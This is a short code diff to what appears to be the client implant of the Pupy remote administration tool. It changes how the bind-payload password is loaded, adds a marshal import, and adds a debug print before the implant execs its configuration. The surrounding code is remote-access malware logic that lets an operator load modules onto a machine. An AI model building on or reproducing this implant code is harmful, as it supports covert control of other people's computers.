@@ -60,6 +60,7 @@ from network import conf
 from network.lib.base_launcher import LauncherError
 import logging
 import shlex
+import marshal
 
 try:
     # additional imports needed to package with pyinstaller
@@ -170,12 +171,14 @@ class BindSlaveService(ReverseSlaveService):
             from pupy_credentials import BIND_PAYLOADS_PASSWORD
             password = BIND_PAYLOADS_PASSWORD
         except:
-            from network.transports import DEFAULT_BIND_PAYLOADS_PASSWORD
-            password = DEFAULT_BIND_PAYLOADS_PASSWORD
+            from pupylib.PupyCredentials import Credentials
+            credentials = Credentials()
+            password = credentials['BIND_PAYLOADS_PASSWORD']
 
         if self._conn.root.get_password() != password:
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
+
         self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
 
 
@@ -230,6 +233,7 @@ def main():
     if 'get_pupy_config' in pupy.__dict__:
         try:
             config_file = pupy.get_pupy_config()
+            print "CONFIG FILE: {}".format(config_file)
             exec config_file in globals()
         except ImportError:
             logging.warning(
